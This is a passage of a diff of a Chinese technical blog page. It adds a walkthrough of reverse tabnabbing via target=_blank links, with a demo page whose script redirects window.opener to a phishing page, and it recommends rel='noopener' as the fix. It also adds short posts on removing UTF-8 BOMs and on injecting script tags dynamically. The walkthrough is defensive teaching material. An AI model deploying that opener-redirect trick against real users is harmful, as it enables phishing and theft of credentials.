class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">dosth</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://b.com/1.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;OK&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>b.com<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;dosth();&quot;</span>&gt;</span>js<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>至此代码准备完毕，开始重现漏洞触发过程</p>
+<p>打开Chrome ，当前版本为 </p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/1.png" alt="1"></p>
+<p>输入a.com&#x2F;1.html 访问</p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/2.png" alt="2"></p>
+<p>点击A标签 B站 此时弹出新页面</p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/3.png" alt="3"></p>
+<p>点击那个JS按钮，执行一段神不知鬼不觉的JS</p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/4.png" alt="4"></p>
+<p>此时浏览器返回去看上一个页面 已经神不知鬼不觉的变成了一个钓鱼页面</p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/5.png" alt="5"></p>
+<p>至此，整个漏洞利用的攻击过程结束。用户以为自己回到了A 结果神不知鬼不觉的访问了 B （页面假装和A一样）<br>如果这个时候用户输入了敏感信息，那么这个信息就会被提交B网站</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>那么只要有A标签的地方，并且使用了_blank的方式打开，那么都会有这个被钓鱼的风险。怎么避免风险呢，</p>
+<p>如果你是一个普通用户，那么在输入敏感信息之前，一定一定一定要确认当前的url是不是正确的url，也就是防钓鱼的那一套。</p>
+<p>如果你是一个开发者，那么请在你的网站上面，所有类似的A标签上加入属性 rel&#x3D;”noopener” 来防止这个漏洞被利用</p>
+<p>但是这里要值得一提的是，noopener 并不是所有浏览器都支持的，它的支持程度如下图</p>
+<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/6.png" alt="6"></p>
+<p>无脑一点的方案就是 rel&#x3D;”nofollow noopener noreferrer”  这样来阻止。</p>
+<p>到此本文最初的目的“最简单的实现一次这个漏洞攻击”已经达到了，还有一些细节没有补充，具体可以阅读原文</p>
+<p><a target="_blank" rel="noopener" href="https://www.tutorialdocs.com/article/html-opener-blank.html">https://www.tutorialdocs.com/article/html-opener-blank.html</a> 来了解更多详情。</p>
 
       
     </div>
@@ -407,7 +397,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2015/07/30/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/07/14/BOM-%E5%A4%B4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8E%BB%E6%8E%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -421,7 +411,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2015/07/30/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/" class="post-title-link" itemprop="url">PHP正则表达式匹配中文字符</a>
+            <a href="/2018/07/14/BOM-%E5%A4%B4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8E%BB%E6%8E%89/" class="post-title-link" itemprop="url">BOM 头是什么，怎么除去件</a>
         </h2>
 
         <div class="post-meta">
@@ -431,7 +421,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2015-07-30 10:22:00" itemprop="dateCreated datePublished" datetime="2015-07-30T10:22:00+08:00">2015-07-30</time>
+              <time title="创建时间：2018-07-14 10:34:00" itemprop="dateCreated datePublished" datetime="2018-07-14T10:34:00+08:00">2018-07-14</time>
             </span>
 
           
@@ -445,10 +435,72 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>网上有很多类似的文章，但往往都不能用 所以记录一下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\x&#123;4e00&#125;-\x&#123;9fa5&#125;])/u&quot;</span>, <span class="variable">$input</span>, <span class="variable">$match</span>);</span><br></pre></td></tr></table></figure>
+          <p>旧版本的 windows 自带的记事本（新版已经没了），在保存一个以 UTF-8 编码的文件时，会在文件开始的地方插入三个不可见的字符（0xEF 0xBB 0xBF，即BOM）。</p>
+<p>它是一串隐藏的字符，用于让记事本等编辑器识别这个文件是否以 UTF-8 编码。对于一般的文本文件，这样并不会产生什么麻烦。但对于 PHP 代码来说，BOM 是个大麻烦。</p>
+<p>PHP并不会忽略BOM，所以在读取、包含或者引用这些文件时，会把 BOM 作为该文件开头正文的一部分。根据html混编语言的特点，这串字符将被直接执行（显示）出来。由此造成即使页面的 top padding 设置为0，也无法让整个网页紧贴浏览器顶部，因为在html一开头有这3个字符呢！</p>
+<p>而且 BOM 是内容输入，如果没有开启缓冲区输出的时候，BOM 会影响 header 函数的使用，因为在header之前不能有任何有效的内容输出，BOM也算是有效内容输出。</p>
+<p>去掉BOM的方法，建议使用专业的代码编辑器工具来处理 例如 Notepad++ 或者 EditPlus 在新建和保存以及转换编码的功能内都会有无 BOM的格式选择。</p>
+<p>shell下可以利用 sed 命令来处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;0,/s/^\xEF\xBB\xBF//&#x27; 文本文件.txt</span><br></pre></td></tr></table></figure>
+      
+    </div>
 
-<p><b>注意：限定代码文件和input字符串都是utf-8编码。其他编码不适用</b></p>
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/06/27/JavaScript%20%E5%8A%A8%E6%80%81%E7%9A%84%E5%9C%A8%E9%A1%B5%E9%9D%A2%E9%87%8C%E6%8F%92%E5%85%A5%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="透明白">
+      <meta itemprop="description" content="凑字数">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="名字还没想好">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/06/27/JavaScript%20%E5%8A%A8%E6%80%81%E7%9A%84%E5%9C%A8%E9%A1%B5%E9%9D%A2%E9%87%8C%E6%8F%92%E5%85%A5%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">jS动态的在页面里插入脚本文件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-06-27 11:07:00" itemprop="dateCreated datePublished" datetime="2018-06-27T11:07:00+08:00">2018-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> obj = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  obj.<span class="property">type</span> = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">  obj.<span class="property">src</span> = <span class="string">&quot;https://your_script_file.js&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(obj);</span><br><span class="line">&#125; ());</span><br></pre></td></tr></table></figure>
+<p>按钮化</p>
+<p><code>&lt;a href=&#39;javascript:(function()&#123;var a=document.createElement(&quot;script&quot;);a.type=&quot;text/javascript&quot;;a.src=&quot;https://your_script_file.js&quot;;document.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;());&#39;&gt;插入&lt;/a&gt;</code></p>
 
       
     </div>
@@ -467,7 +519,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -533,14 +585,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">97</span>
+          <span class="site-state-item-count">117</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">156</span>
+        <span class="site-state-item-count">180</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
